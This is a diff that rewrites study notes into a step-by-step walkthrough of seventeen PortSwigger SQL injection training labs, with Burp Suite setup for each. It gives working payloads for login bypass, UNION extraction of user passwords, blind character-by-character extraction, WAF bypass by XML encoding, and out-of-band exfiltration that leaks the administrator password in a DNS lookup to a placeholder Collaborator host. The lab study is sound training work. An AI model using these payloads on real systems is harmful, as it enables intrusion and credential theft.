@@ -1,298 +1,448 @@
-# PortSwigger SQL Injection Labs — Notes & Walkthrough Logic
+# PortSwigger SQL Injection — Complete Lab Walkthrough (All Labs, Beginner-Friendly)
 
-> Personal reference notes for the PortSwigger Web Security Academy SQL Injection track.
-> Format: **What it is → What to change in Burp → What "it worked" looks like → What "something's wrong" looks like.**
+This covers every lab in the PortSwigger Web Security Academy **SQL Injection** track, in order of difficulty. Each lab follows the same format:
 
----
+- **Goal** — what you're trying to achieve
+- **Payload / Steps** — exact values to type, and where
+- **Burp Setup** — which tab, what to click, what to configure
+- **Expected Result** — what tells you it worked
+- **If Something's Wrong** — what a bad result usually means
 
-## 1. SQL Injection: Retrieving Hidden Data
-
-**Scenario:** A product filter (e.g. `?category=Gifts`) builds a query like:
-```sql
-SELECT * FROM products WHERE category = 'Gifts' AND released = 1
-```
-
-**What to do:**
-- Send the request to Burp Repeater.
-- In the `category` parameter, change the value to break out of the string and neutralize the rest of the WHERE clause:
-  ```
-  category=Gifts'--
-  ```
-  or to pull *everything* regardless of category:
-  ```
-  category=Gifts'+OR+1=1--
-  ```
-- `--` (with a trailing space, or `-- -` in URL form) comments out the rest of the original query so `AND released = 1` never executes.
-
-**Result if it worked:**
-- The response now shows **unreleased products** or **all categories' products** instead of just the filtered set — more rows/items appear in the HTML than a normal category page would ever show.
-
-**Result if something's wrong:**
-- A 500 error or a generic "Internal Server Error" page → your quote broke the syntax but your comment didn't land correctly (e.g. missing space after `--`, or the backend uses a different comment style).
-- No change in the response at all → the parameter might not be the injectable one, or it's not reaching the DB as a raw string (could be pre-validated/escaped).
+Read the **Burp Concepts Primer** once at the start — every later lab refers back to it instead of re-explaining the same tool.
 
 ---
 
-## 2. SQL Injection: Login Bypass
-
-**Scenario:** Login query looks like:
-```sql
-SELECT * FROM users WHERE username = 'admin' AND password = 'x'
-```
-
-**What to do:**
-- In the `username` field, submit:
-  ```
-  administrator'--
-  ```
-- Leave the password field as anything (it gets commented out).
-
-**Result if it worked:**
-- You're redirected to `/my-account` and the page shows you're logged in as `administrator`.
-
-**Result if something's wrong:**
-- "Invalid username or password" still shows → either the username doesn't exist as typed, or the app parameterizes this specific field (not exploitable here), or there's extra whitespace/encoding issue in what you sent (check Burp's raw request, not just the browser).
-- Check the response length in Burp — a bypassed login response is usually noticeably longer/shorter than the failed-login response, which is a quick tell even before reading content.
-
----
-
-## 3. UNION Attack: Determining the Number of Columns
-
-**Scenario:** You suspect UNION-based extraction is possible but need the column count first.
-
-**What to do (two methods):**
-- **ORDER BY method:** Increment a number until it errors:
-  ```
-  ?category=Gifts' ORDER BY 1--
-  ?category=Gifts' ORDER BY 2--
-  ?category=Gifts' ORDER BY 3--   ← keep going
-  ```
-  The number where it errors means the previous number was the actual column count.
-- **UNION SELECT NULL method:** Add NULLs one at a time:
-  ```
-  ?category=Gifts' UNION SELECT NULL--
-  ?category=Gifts' UNION SELECT NULL,NULL--
-  ```
-  Keep adding NULLs until no error.
-
-**Result if it worked (found the right count):**
-- Page loads normally (HTTP 200), same layout as before, no DB error text.
-
-**Result if something's wrong:**
-- An error like "The used SELECT statements have a different number of columns" → you haven't hit the right count yet, keep adjusting.
-- A generic app-level error unrelated to columns → your injection point/quote handling is off, re-check syntax before continuing the column hunt.
-
----
-
-## 4. UNION Attack: Finding a Column That Contains Text
-
-**Scenario:** You know the column count (say 3), now need to know which column(s) can hold string data so you can inject readable output.
-
-**What to do:**
-- Replace NULLs one at a time with a string:
-  ```
-  ' UNION SELECT 'a',NULL,NULL--
-  ' UNION SELECT NULL,'a',NULL--
-  ' UNION SELECT NULL,NULL,'a'--
-  ```
-
-**Result if it worked:**
-- The literal string `'a'` (or whatever you used) shows up rendered somewhere in the page — that tells you exactly which column position is reflected in the visible output.
-
-**Result if something's wrong:**
-- Error like "conversion failed when converting the varchar value... to data type int" → that column is numeric-only, move to the next position.
-- String doesn't appear anywhere even though no error → the column might be selected but not rendered in the HTML (e.g. used for an image URL or hidden attribute) — view page source, not just the rendered page.
-
----
-
-## 5. UNION Attack: Retrieving Data from Other Tables
-
-**Scenario:** Once you have the injectable column, pull data from `users` table instead of `products`.
-
-**What to do:**
-```
-' UNION SELECT username, password FROM users--
-```
-(adjust NULL/column count/positions to match what you found earlier, e.g.:
-```
-' UNION SELECT username, password, NULL FROM users--
-```
-
-**Result if it worked:**
-- Usernames and password hashes/values appear directly in the page body where product names would normally show.
-
-**Result if something's wrong:**
-- "Invalid object name 'users'" → wrong table name; you may need to enumerate table names first (see Section 9).
-- Data appears but garbled/truncated → you may have picked a column that's length-limited on the frontend; try a different column position.
-
----
-
-## 6. UNION Attack: Retrieving Multiple Values in a Single Column
-
-**Scenario:** Only one column is rendered as text, but you need both username and password.
-
-**What to do:**
-- Concatenate the two values into one string with a separator, using the DB's concat syntax:
-  ```
-  ' UNION SELECT username || '~' || password, NULL FROM users--
-  ```
-  (Oracle/PostgreSQL use `||`; MySQL uses `CONCAT(username,'~',password)`; SQL Server uses `+`.)
-
-**Result if it worked:**
-- You see something like `administrator~8a55dc...` in a single rendered field — the `~` (or whatever separator) lets you split username from password visually.
-
-**Result if something's wrong:**
-- Syntax error → wrong concatenation operator for that DB engine. This is also a **fingerprinting signal**: which concat syntax doesn't error tells you the underlying DBMS (useful going forward).
-
----
-
-## 7. Blind SQLi: Conditional Responses
-
-**Scenario:** No error messages, no reflected output — but the app behaves *differently* depending on true/false conditions (e.g., a "Welcome back" banner shows or doesn't, based on a cookie value used in a query).
-
-**What to do:**
-- Send a request with a boolean-true condition in the injectable parameter (often a `TrackingId` cookie):
-  ```
-  TrackingId=xyz' AND '1'='1
-  ```
-  vs a boolean-false:
-  ```
-  TrackingId=xyz' AND '1'='2
-  ```
-- Use **Burp Intruder** with the payload position on the condition, cycling through guesses (e.g., testing each character of a password):
-  ```
-  TrackingId=xyz' AND SUBSTRING(password,1,1)='a
-  ```
-
-**Result if it worked:**
-- The TRUE condition produces one visible page state (e.g. "Welcome back") and FALSE produces another (no banner) — that binary difference is your oracle. In Intruder, this shows as a **response length or status difference** between payloads — sort the results by length/status to instantly see which guesses were "true."
-
-**Result if something's wrong:**
-- Every response looks identical regardless of condition → either the injection point is wrong, or the query isn't actually being affected by your input (test with an obviously true `1=1` vs obviously false `1=2` first, before testing real data).
-- Note: you mentioned losing visibility from Intruder's "Show only items with notes" filter — worth flagging as a checklist item: **always confirm that filter is off before assuming "no results" means "no hits."**
-
----
-
-## 8. Blind SQLi: Conditional Errors
-
-**Scenario:** No visible difference in page content, but the app throws a 500 error under certain injected conditions (e.g., a division-by-zero trick forces an error only when a condition is true).
-
-**What to do:**
-```
-' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
-```
-Swap `1=1` for the actual condition you're testing (e.g., checking a password character).
-
-**Result if it worked:**
-- When the condition is TRUE, you get a 500 Internal Server Error (division by zero triggered). When FALSE, you get a normal 200 response.
-
-**Result if something's wrong:**
-- Errors every time regardless of condition → your CASE/WHEN syntax itself is malformed, not the condition.
-- Never errors → the DBMS might not support this exact division-by-zero trick (engine-specific); try a different error-forcing function.
-
----
-
-## 9. Blind SQLi: Time Delays
-
-**Scenario:** No content difference, no error difference — the only oracle is *how long the response takes*.
-
-**What to do:**
-```
-'; IF (1=1) WAITFOR DELAY '0:0:5'--    (SQL Server)
-' AND SLEEP(5)--                        (MySQL)
-' || pg_sleep(5)--                      (PostgreSQL)
-```
-Watch the **response time** in Burp Repeater (shown bottom-right).
-
-**Result if it worked:**
-- Response takes ~5 seconds longer when condition is TRUE, returns instantly when FALSE.
-
-**Result if something's wrong:**
-- No delay ever → wrong DB-specific syntax, or query isn't reaching the DB at all (test with an unconditional delay first, e.g. just `SLEEP(5)` alone, to confirm injection works before adding conditions).
-- Delay happens *every time* regardless of your condition → your condition logic is broken (e.g., AND vs OR precedence), so double check parentheses.
-
----
-
-## 10. Blind SQLi: Time Delays + Information Retrieval
-
-**Scenario:** Same as above, but now extracting actual data character-by-character (e.g., an admin password) using conditional time delays.
-
-**What to do:**
-- Use Burp Intruder with a **cluster bomb or sniper attack** testing each character position against each possible character:
-  ```
-  ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)-- (MySQL)
-  ```
-- Iterate position (1,2,3...) and character (a-z,0-9) until each position resolves.
-
-**Result if it worked:**
-- For the correct character at a given position, response time spikes (~5s+); for all incorrect characters, response is fast. Sort Intruder results by **response time column** to spot the outlier.
-
-**Result if something's wrong:**
-- All responses uniformly slow → possible false positive from server load; increase delay to make the signal clearer (e.g., 10s) and re-test.
-- All responses uniformly fast, no hits ever → check that your SUBSTRING indices are 1-based (not 0-based) and that the string comparison is case-sensitive/insensitive as expected by the DB.
-
----
-
-## 11. Blind SQLi with Out-of-Band (OOB) Interaction
-
-**Scenario:** No usable response difference at all (no content, error, or timing signal) — need to exfiltrate via DNS/HTTP callback using **Burp Collaborator**.
-
-**What to do:**
-- Generate a unique Collaborator payload (Burp → Collaborator tab → "Copy to clipboard").
-- Inject a DB command that forces an out-of-band network call to that domain:
-  ```
-  '; EXEC master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--   (SQL Server)
-  ```
-  For data exfiltration (not just confirmation), embed the queried value into the subdomain:
-  ```
-  '||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
-  ```
-
-**Result if it worked:**
-- Burp Collaborator's "poll now" shows a DNS or HTTP interaction logged from the target server — confirming blind execution even with zero visible response difference. If you exfiltrated data in the subdomain, it appears in the logged DNS lookup itself.
-
-**Result if something's wrong:**
-- No interaction logged at all → either the injection didn't execute, the target has no outbound network access/egress filtering, or the specific OOB technique isn't supported by that DB engine — try a different OOB method for the same DBMS.
-- Interaction logged but with malformed/truncated subdomain data → DNS label length limits (63 chars per label) — you may need to chunk the extracted data across multiple requests.
-
----
-
-## 12. Visible Error-Based SQLi
-
-**Scenario:** The app returns raw DB error messages, which can be abused to leak data through the error text itself (no need for UNION/blind at all).
-
-**What to do:**
-- Force a type-conversion error that embeds a subquery's result inside the error message:
-  ```
-  ' AND 1=CONVERT(int,(SELECT @@version))--        (SQL Server)
-  ' AND extractvalue(1,concat(0x7e,(SELECT version())))--  (MySQL)
-  ```
-
-**Result if it worked:**
-- The error page itself contains readable data (DB version string, table names, or query results) embedded directly in the error text — no need to blind-guess character by character.
-
-**Result if something's wrong:**
-- Generic error with no embedded data → error verbosity might be disabled in this app config, or the conversion function used doesn't match the DB engine — confirm DBMS type first (see fingerprinting note in Section 6).
-
----
-
-## Quick Fingerprinting Cheatsheet (useful before choosing syntax above)
+## 🔧 Burp Concepts Primer (read this once)
+
+- **Repeater** — send one request, tweak it, resend it, see the response. Use this to manually test payload syntax before automating anything.
+- **Intruder** — automates sending *many variations* of the same request and shows results in a table you can scan/sort.
+- **Positions tab (§...§)** — marks exactly which part of a request Intruder should swap out on each attempt.
+- **Attack types:**
+  - **Sniper** = one payload set, tested one position at a time. Use when only ONE thing varies.
+  - **Cluster Bomb** = multiple independent payload sets, tested in every combination. Use when TWO+ things vary independently (e.g. character position + character guess).
+- **Payloads tab** — defines what values get substituted into each `§...§` marker (numbers, wordlists, character sets).
+- **Grep - Match** (Settings/Options tab) — scans every response for a fixed phrase and adds a ✓/✗ column so you don't read every response manually.
+- **Grep - Extract** — pulls out and displays a specific snippet of text from each response (useful when the actual data is reflected back, not just a yes/no signal).
+- **Comment syntax** — `--` (with trailing space) works on most DBs; MySQL also accepts `#`.
+- **DBMS fingerprint cheatsheet** (you'll need this repeatedly):
 
 | Check | MySQL | SQL Server | PostgreSQL | Oracle |
 |---|---|---|---|---|
-| Comment | `--space` or `#` | `--` | `--` | `--` |
+| Comment | `-- ` or `#` | `--` | `--` | `--` |
 | Concatenation | `CONCAT(a,b)` | `a + b` | `a \|\| b` | `a \|\| b` |
 | Sleep/delay | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `dbms_lock.sleep(5)` |
-| Version query | `SELECT @@version` | `SELECT @@version` | `SELECT version()` | `SELECT * FROM v$version` |
-| Current DB | `SELECT database()` | `SELECT DB_NAME()` | `SELECT current_database()` | `SELECT ora_database_name FROM dual` |
-
-**General debugging checklist when a lab isn't behaving:**
-1. Confirm the injection point first with the simplest possible test (`'` alone → should break something visibly).
-2. Confirm DBMS type using the fingerprinting table above before assuming your payload syntax is "correct but not working."
-3. In Intruder, double-check filters (like "Show only items with notes") aren't hiding real hits.
-4. Compare response **length** and **time**, not just visible text — many signals are non-obvious.
-5. Always test an unconditional version of a payload (always-true, or unconditional delay) before layering in the actual condition you're trying to extract.
+| Version query | `SELECT @@version` | `SELECT @@version` | `SELECT version()` | `SELECT banner FROM v$version` |
+| Table listing | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
+| Dummy table (for SELECT without FROM) | not needed | not needed | not needed | `FROM dual` required |
 
 ---
 
-*Part of the 90-day cybersecurity roadmap — Phase 1 (Web/PortSwigger track). Pair with the XSS labs notes for the full Web Security Academy foundation set.*
+## Lab 1: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data
+
+**Goal:** A product category filter hides "unreleased" products. Bypass the filter to see them.
+
+**Payload / Steps:**
+- Find the request with `?category=Gifts` (or similar) in Burp Proxy history, send to Repeater.
+- Change the parameter:
+  ```
+  category=Gifts'--
+  ```
+
+**Burp Setup:** Just Repeater — no Intruder needed for this one.
+
+**Expected Result:** The page now shows extra products (including unreleased ones) that weren't visible before — more rows in the response HTML than the normal filtered view.
+
+**If Something's Wrong:**
+- 500 error → check for a space after `--` (some backends require `-- ` not just `--`).
+- No change → this might not be the injectable parameter; check other parameters in the request.
+
+---
+
+## Lab 2: SQL Injection Vulnerability Allowing Login Bypass
+
+**Goal:** Log in as `administrator` without knowing the password.
+
+**Payload / Steps:**
+- On the login form, in the **username** field enter:
+  ```
+  administrator'--
+  ```
+- Password field: anything (it gets commented out of the query).
+
+**Burp Setup:** None needed — can be done directly in the browser, or via Repeater if you want to see the raw response first.
+
+**Expected Result:** You're redirected to `/my-account`, page shows you're logged in as administrator.
+
+**If Something's Wrong:**
+- "Invalid username or password" persists → check for typos/extra whitespace in what you actually sent (view the raw request in Burp, not just what you typed in the browser — the browser can sometimes trim things).
+
+---
+
+## Lab 3: UNION Attack — Determining the Number of Columns
+
+**Goal:** Find how many columns the underlying query returns, needed before any UNION-based extraction.
+
+**Payload / Steps (try incrementing until no error):**
+```
+?category=Gifts' ORDER BY 1--
+?category=Gifts' ORDER BY 2--
+?category=Gifts' ORDER BY 3--   ← etc.
+```
+Or alternatively:
+```
+?category=Gifts' UNION SELECT NULL--
+?category=Gifts' UNION SELECT NULL,NULL--
+```
+
+**Burp Setup:** Repeater is enough since it's just a handful of attempts.
+
+**Expected Result:** Page loads normally (HTTP 200, no DB error) — the number where this first happens is your column count.
+
+**If Something's Wrong:**
+- Error: "different number of columns" → increment and try again.
+- Unrelated app error → your quote/comment syntax is broken before you even get to counting columns; fix that first.
+
+---
+
+## Lab 4: UNION Attack — Finding a Column Containing Text
+
+**Goal:** Given the column count (say 3), find which column position can hold a string so it's visible in the page.
+
+**Payload / Steps:**
+```
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--
+```
+
+**Burp Setup:** Repeater.
+
+**Expected Result:** The literal `a` appears rendered somewhere on the page — that column position accepts and displays text.
+
+**If Something's Wrong:**
+- "Conversion failed... varchar to int" → that column is numeric-only, try the next position.
+- String doesn't render even without an error → it may be selected but not displayed (e.g. used in an image `alt` or hidden field) — check page source, not just visible text.
+
+---
+
+## Lab 5: UNION Attack — Retrieving Data from Other Tables
+
+**Goal:** Pull `username`/`password` from the `users` table instead of the products table.
+
+**Payload / Steps:**
+```
+' UNION SELECT username, password FROM users--
+```
+(pad with NULLs to match your column count, e.g. `' UNION SELECT username, password, NULL FROM users--`)
+
+**Burp Setup:** Repeater.
+
+**Expected Result:** Usernames and password values appear directly on the page where product info would normally show.
+
+**If Something's Wrong:**
+- "Invalid object name 'users'" → wrong table name guess; enumerate real table names first (see Lab 9/10).
+- Data looks cut off → frontend may be truncating long text in that field; try a different column position.
+
+---
+
+## Lab 6: UNION Attack — Retrieving Multiple Values in a Single Column
+
+**Goal:** Only ONE column renders as visible text, but you need two values (username + password).
+
+**Payload / Steps (concatenate with a separator):**
+```
+' UNION SELECT username || '~' || password, NULL FROM users--     -- Oracle/PostgreSQL
+' UNION SELECT CONCAT(username,'~',password), NULL FROM users--   -- MySQL
+' UNION SELECT username + '~' + password, NULL FROM users--        -- SQL Server
+```
+
+**Burp Setup:** Repeater.
+
+**Expected Result:** You see something like `administrator~8a55dc...` rendered as one string — split on `~` to get both values.
+
+**If Something's Wrong:**
+- Syntax error → wrong concat operator for this DB — this itself tells you which DBMS you're NOT dealing with; try the next one from the cheatsheet.
+
+---
+
+## Lab 7: SQL Injection — Querying Database Type and Version (Oracle)
+
+**Goal:** Confirm you're on Oracle and extract the version banner.
+
+**Payload / Steps:**
+```
+' UNION SELECT banner, NULL FROM v$version--
+```
+Oracle requires `FROM` on every SELECT (no bare `SELECT 'x'` allowed) — that's actually a fingerprinting clue: if a bare `UNION SELECT 'x'--` errors with something like "FROM keyword not found," you're likely on Oracle.
+
+**Burp Setup:** Repeater.
+
+**Expected Result:** Oracle version string appears in the response (e.g. "Oracle Database 19c...").
+
+**If Something's Wrong:**
+- "FROM keyword not found" even with `FROM dual` → check you spelled `dual` correctly, it's a real dummy table in Oracle used specifically for this.
+
+---
+
+## Lab 8: SQL Injection — Querying Database Type and Version (MySQL / Microsoft)
+
+**Goal:** Extract version string on MySQL or SQL Server (both allow bare SELECT without FROM).
+
+**Payload / Steps:**
+```
+' UNION SELECT @@version, NULL--
+```
+
+**Burp Setup:** Repeater.
+
+**Expected Result:** A version string appears (e.g. "10.x-MariaDB" or "Microsoft SQL Server 2019...").
+
+**If Something's Wrong:**
+- Error on this exact syntax → you might actually be on Oracle instead (see Lab 7) — the "no FROM required" behavior is what differentiates MySQL/MSSQL from Oracle.
+
+---
+
+## Lab 9: SQL Injection — Listing the Database Contents (Non-Oracle)
+
+**Goal:** Enumerate table and column names you don't know yet, then extract from them.
+
+**Payload / Steps (three stages):**
+
+1. List tables:
+   ```
+   ' UNION SELECT table_name, NULL FROM information_schema.tables--
+   ```
+2. List columns for a specific table (once you spot something like `users_abcd`):
+   ```
+   ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcd'--
+   ```
+3. Extract the actual data using the real table/column names found:
+   ```
+   ' UNION SELECT username_xyz, password_xyz FROM users_abcd--
+   ```
+
+**Burp Setup:** Repeater for each stage — do them in order, since each stage's output feeds the next payload.
+
+**Expected Result:** Stage 1 shows a list of table names in the response. Stage 2 shows column names for that table. Stage 3 shows actual usernames/passwords.
+
+**If Something's Wrong:**
+- Empty results in stage 1 → some apps restrict `information_schema` access; unlikely in these labs but double-check spelling.
+- Too many tables to read comfortably → view page source and search (Ctrl+F) for "table_name" pattern rather than scrolling visually.
+
+---
+
+## Lab 10: SQL Injection — Listing the Database Contents (Oracle)
+
+**Goal:** Same as Lab 9, but Oracle uses different system tables.
+
+**Payload / Steps:**
+
+1. List tables:
+   ```
+   ' UNION SELECT table_name, NULL FROM all_tables--
+   ```
+2. List columns:
+   ```
+   ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCD'--
+   ```
+   *(Oracle stores unquoted identifiers in UPPERCASE by default — if you get no results, try the table name in all caps.)*
+3. Extract data:
+   ```
+   ' UNION SELECT username_xyz, password_xyz FROM users_abcd--
+   ```
+
+**Burp Setup:** Repeater.
+
+**Expected Result:** Same as Lab 9 — table names, then column names, then real data.
+
+**If Something's Wrong:**
+- No columns returned in stage 2 → almost always a case-sensitivity issue; retry with the table name in UPPERCASE.
+
+---
+
+## Lab 11: Blind SQL Injection with Conditional Responses
+
+*(Full detailed walkthrough — already covered in depth previously; condensed version here for completeness.)*
+
+**Goal:** Extract the administrator's password using only a "Welcome back" yes/no signal.
+
+**Payload / Steps:**
+1. Confirm oracle: `TrackingId=xyz' AND '1'='1` vs `'1'='2` — first shows "Welcome back", second doesn't.
+2. Confirm username exists: `AND (SELECT 'a' FROM users WHERE username='administrator')='a'`
+3. Find password length using Intruder **Sniper** + numeric payload + Grep Match on "Welcome back":
+   ```
+   AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a'
+   ```
+4. Extract each character using Intruder **Cluster Bomb** (position + character), Grep Match on "Welcome back":
+   ```
+   AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,§1§,1)='§a§')='a'
+   ```
+
+**Burp Setup:** Intruder — Sniper for length, Cluster Bomb for character extraction; Grep Match added in Settings/Options tab both times.
+
+**Expected Result:** ✓ column flips from true to false at the exact password length; later, exactly one ✓ per character position gives you the password.
+
+**If Something's Wrong:** See the dedicated troubleshooting table in the companion note (Blind SQLi Conditional Responses Walkthrough) — most common issue is the Intruder "Show only items with notes" filter hiding real hits, or miscounting SUBSTRING's 1-based indexing.
+
+---
+
+## Lab 12: Blind SQL Injection with Conditional Errors
+
+**Goal:** No visible content difference at all — but the app throws a 500 error under a TRUE condition (via a forced division-by-zero).
+
+**Payload / Steps:**
+```
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+Swap `1=1` for real checks, e.g. testing username existence:
+```
+' AND (SELECT CASE WHEN (username='administrator') THEN 1/0 ELSE 'a' END FROM users)='a
+```
+Then password length:
+```
+' AND (SELECT CASE WHEN (LENGTH(password)>§1§) THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a
+```
+Then character-by-character (Cluster Bomb, same idea as Lab 11):
+```
+' AND (SELECT CASE WHEN (SUBSTRING(password,§1§,1)='§a§') THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a
+```
+
+**Burp Setup:**
+- Same Intruder attack types as Lab 11 (Sniper for length, Cluster Bomb for characters).
+- Instead of Grep Match on text, use **Grep Match on HTTP status code / error text**, or simply watch the response's **status code column** in Intruder results — TRUE condition = 500 error, FALSE = 200 OK.
+
+**Expected Result:** Status code column shows 500 for the correct guess, 200 for wrong guesses — the pattern flips the same way as the "Welcome back" text did in Lab 11.
+
+**If Something's Wrong:**
+- Every request errors → CASE/WHEN syntax itself malformed — verify parentheses balance carefully in Repeater first.
+- Never errors → this specific division-by-zero trick isn't supported by this DB engine — check DBMS type via the fingerprint table.
+
+---
+
+## Lab 13: Blind SQL Injection with Time Delays
+
+**Goal:** No content or error difference — only signal is how long the response takes.
+
+**Payload / Steps (confirm unconditional delay first):**
+```
+'; SELECT SLEEP(5)--          -- MySQL, confirm injection works at all
+'; WAITFOR DELAY '0:0:5'--    -- SQL Server
+'; SELECT pg_sleep(5)--       -- PostgreSQL
+```
+Then make it conditional:
+```
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+```
+
+**Burp Setup:**
+- Repeater is enough to confirm the basic mechanism (watch the response time indicator in the bottom right).
+- For automation, Intruder + Sniper, but instead of Grep Match, sort results by the **Response time / Response received** column.
+
+**Expected Result:** ~5+ second delay when condition is TRUE, near-instant when FALSE.
+
+**If Something's Wrong:**
+- No delay ever → wrong DB-specific syntax; confirm DBMS type first with an *unconditional* sleep before adding conditions.
+- Delay happens every time regardless of condition → check AND/OR operator precedence and parentheses in your condition logic.
+
+---
+
+## Lab 14: Blind SQL Injection with Time Delays and Information Retrieval
+
+**Goal:** Same time-delay oracle as Lab 13, but now extracting the actual password character by character.
+
+**Payload / Steps:**
+```
+'; IF (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password,§1§,1)='§a§') = 1 WAITFOR DELAY '0:0:5'--
+```
+
+**Burp Setup:**
+- Intruder, **Cluster Bomb** (position + character, same structure as Lab 11's character extraction).
+- No Grep Match needed here — instead, sort/inspect the **response time column**. The row with a ~5s+ delay for a given position is the correct character.
+
+**Expected Result:** For each position, exactly one character guess produces a multi-second delay; all others return instantly.
+
+**If Something's Wrong:**
+- All rows same speed → confirm the unconditional delay from Lab 13 still works standalone before layering in the SUBSTRING condition.
+- Inconsistent timing (some slow for no clear reason) → server load noise; increase delay to 8–10s to make the real signal unambiguous.
+
+---
+
+## Lab 15: Blind SQL Injection with Out-of-Band (OOB) Interaction
+
+**Goal:** Confirm blind injection execution using DNS/HTTP callbacks via **Burp Collaborator**, since there's no usable in-band signal at all.
+
+**Payload / Steps:**
+1. Open the **Collaborator tab** in Burp, click "Copy to clipboard" to get a unique subdomain.
+2. Inject a command that forces a network callback to that subdomain:
+   ```
+   '; EXEC master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--     -- SQL Server
+   ' UNION SELECT UTL_HTTP.REQUEST('http://BURP-COLLABORATOR-SUBDOMAIN')--   -- Oracle
+   ```
+3. Send the request in Repeater.
+4. Go back to Collaborator tab → click **"Poll now"**.
+
+**Burp Setup:** Repeater to send, Collaborator tab to check for interactions.
+
+**Expected Result:** Collaborator shows a logged DNS or HTTP interaction from the target server — this alone proves the injection executed, even with zero visible response difference.
+
+**If Something's Wrong:**
+- No interaction logged → either injection didn't execute (check syntax in Repeater against a known-working payload style first), or this specific OOB technique isn't supported by the DB engine — try the alternate syntax for a different DBMS.
+- Interaction logged but hours later / not at all → make sure you're polling AFTER giving the request a few seconds to actually reach the target; some labs have slight delay.
+
+---
+
+## Lab 16: Blind SQL Injection with Out-of-Band Data Exfiltration
+
+**Goal:** Not just confirm execution — actually extract real data (the password) by embedding it inside the DNS lookup itself.
+
+**Payload / Steps:**
+```
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
+```
+(This is Oracle-specific syntax using XML external entity behavior to smuggle data into a DNS lookup.)
+
+**Burp Setup:** Repeater to send, Collaborator tab → Poll now to check results.
+
+**Expected Result:** The Collaborator interaction log shows a DNS lookup where the **subdomain itself contains the extracted password** (e.g. `yourpasswordhere.abcxyz.burpcollaborator.net`).
+
+**If Something's Wrong:**
+- Interaction logged but subdomain looks empty/truncated → DNS labels have a 63-character limit; if the password + collaborator domain exceeds that, you may need to extract it in chunks (e.g. `SUBSTRING(password,1,10)` then `SUBSTRING(password,11,10)` as separate requests).
+- No interaction at all → verify the XML/entity syntax exactly matches Oracle's expected format — a single misplaced quote breaks the whole payload silently.
+
+---
+
+## Lab 17: SQL Injection with Filter Bypass via XML Encoding
+
+**Goal:** A web application firewall (WAF) or input filter blocks obvious SQLi keywords/characters. Bypass it by XML-encoding the payload (relevant when the request body is XML, e.g. a "check stock" feature using XML/SOAP-style input).
+
+**Payload / Steps:**
+1. Identify the XML-based request (e.g. a `storeId`/`productId` XML body sent to a stock-check endpoint).
+2. Take your working SQLi payload (e.g. `' OR '1'='1`) and XML-encode the problematic characters using **hex character references**:
+   ```
+   &#x27; OR &#x27;1&#x27;=&#x27;1
+   ```
+   (`&#x27;` is the XML hex entity for a single quote `'`)
+3. In Burp, you can select the payload text and use **Ctrl+U** (or right-click → "Convert selection" if available) to quickly XML-encode it, or do it manually.
+
+**Burp Setup:** Repeater — modify the raw XML body directly, since this isn't a simple URL parameter.
+
+**Expected Result:** The filter/WAF no longer blocks the request (no "request blocked" page), and the underlying SQLi executes normally — same result as if there was no filter at all (e.g. product data leaks, or whatever the base lab's goal is).
+
+**If Something's Wrong:**
+- Still blocked → the filter might be checking the *decoded* value too (defense in depth) — try double-encoding, or check if a different character subset needs encoding.
+- Encoding breaks the XML structure itself (malformed XML error) → make sure you're only encoding the SQL special characters, not XML syntax characters like `<` `>` that are part of the tags themselves.
+
+---
+
+## General Debugging Checklist (applies to all labs above)
+
+1. Confirm the injection point first with the simplest possible test (a lone `'` should visibly break something).
+2. Confirm DBMS type using the fingerprint table in the primer section before assuming your syntax is "correct but not working."
+3. In Intruder, double-check filters like "Show only items with notes" aren't hiding real hits.
+4. Compare response **length**, **status code**, and **time** — not just visible text.
+5. Always test an unconditional version of a payload (always-true condition, or unconditional time delay) before layering in the real condition you're trying to extract.
+6. Remember SQL string indexing (`SUBSTRING`) is **1-based**, not 0-based — a common off-by-one mistake.
+
+---
+
+*Part of the 90-day cybersecurity roadmap — Phase 1 (Web/PortSwigger track). Full SQL Injection lab set, apprentice → expert.*
